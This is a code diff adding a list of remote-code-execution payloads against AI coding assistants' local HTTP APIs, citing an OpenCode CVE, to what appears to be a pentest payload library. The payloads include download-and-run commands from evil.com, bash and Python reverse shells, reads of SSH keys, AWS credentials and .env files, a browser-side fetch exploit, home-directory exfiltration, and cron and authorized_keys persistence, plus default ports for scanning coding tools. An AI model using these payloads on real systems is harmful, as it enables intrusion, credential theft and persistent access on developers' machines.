@@ -784,6 +784,7 @@ def get_all_payloads() -> Dict[str, List[str]]:
         "nosql": NOSQL_PAYLOADS,
         "ldap": LDAP_PAYLOADS,
         "crlf": CRLF_PAYLOADS,
+        "ai_coding_rce": AI_CODING_ASSISTANT_RCE_PAYLOADS,
     }
 
 
@@ -795,6 +796,70 @@ def get_payload_counts() -> Dict[str, int]:
     counts["credentials"] = len(COMMON_CREDENTIALS)
     counts["total"] = sum(counts.values())
     return counts
+
+
+# ============================================================================
+# AI CODING ASSISTANT RCE PAYLOADS (CVE-2026-22812 and similar)
+# ============================================================================
+
+AI_CODING_ASSISTANT_RCE_PAYLOADS = [
+    # CVE-2026-22812 - OpenCode (pre-v1.0.216)
+    # Unauthenticated RCE via local HTTP API
+    
+    # Create session and execute command
+    '{"agent":"build","command":"id"}',
+    '{"agent":"build","command":"whoami"}',
+    '{"agent":"build","command":"cat /etc/passwd"}',
+    '{"agent":"build","command":"curl http://evil.com/shell.sh|bash"}',
+    '{"agent":"build","command":"wget -O- http://evil.com/shell.sh|bash"}',
+    
+    # Windows variants
+    '{"agent":"build","command":"dir C:\\\\"}',
+    '{"agent":"build","command":"type C:\\\\Windows\\\\win.ini"}',
+    '{"agent":"build","command":"powershell -c \\"IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/ps.ps1\')\\"}',
+    
+    # Reverse shell payloads
+    '{"agent":"build","command":"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"}',
+    '{"agent":"build","command":"python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\\"ATTACKER\\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])\'"}',
+    
+    # File operations
+    '{"command":"read","path":"/etc/passwd"}',
+    '{"command":"read","path":"C:\\\\Windows\\\\win.ini"}',
+    '{"command":"read","path":"~/.ssh/id_rsa"}',
+    '{"command":"read","path":"~/.aws/credentials"}',
+    '{"command":"read","path":".env"}',
+    
+    # PTY endpoints (interactive shell)
+    '{"cols":80,"rows":24,"command":"/bin/bash"}',
+    '{"cols":80,"rows":24,"command":"cmd.exe"}',
+    '{"cols":80,"rows":24,"command":"powershell.exe"}',
+    
+    # Browser-based exploitation (pre-CORS fix)
+    # These are JavaScript payloads that exploit visitors
+    "fetch('http://127.0.0.1:4096/session',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'}).then(r=>r.json()).then(s=>{fetch(`http://127.0.0.1:4096/session/${s.id}/shell`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent:'build',command:'id > /tmp/pwned'})})})",
+    
+    # Port scanning for coding assistants
+    # Common ports: 4096 (OpenCode), 3000 (Cursor), 8080 (generic)
+    '{"target_ports":[4096,3000,3001,8080,8081,5000]}',
+    
+    # Data exfiltration
+    '{"agent":"build","command":"tar czf - /home | base64 | curl -X POST -d @- http://evil.com/exfil"}',
+    '{"agent":"build","command":"zip -r - . | curl -X POST --data-binary @- http://evil.com/exfil"}',
+    
+    # Persistence
+    '{"agent":"build","command":"echo \'* * * * * curl http://evil.com/beacon\' | crontab -"}',
+    '{"agent":"build","command":"echo \'ssh-rsa AAAA... attacker@evil\' >> ~/.ssh/authorized_keys"}',
+]
+
+# Default ports for AI coding assistants
+AI_CODING_ASSISTANT_PORTS = {
+    "opencode": [4096, 4097, 4098, 4099],
+    "cursor": [3000, 3001],
+    "github_copilot": [8080],
+    "codeium": [3300],
+    "tabnine": [9000],
+    "continue": [65432],
+}
 
 
 # ============================================================================
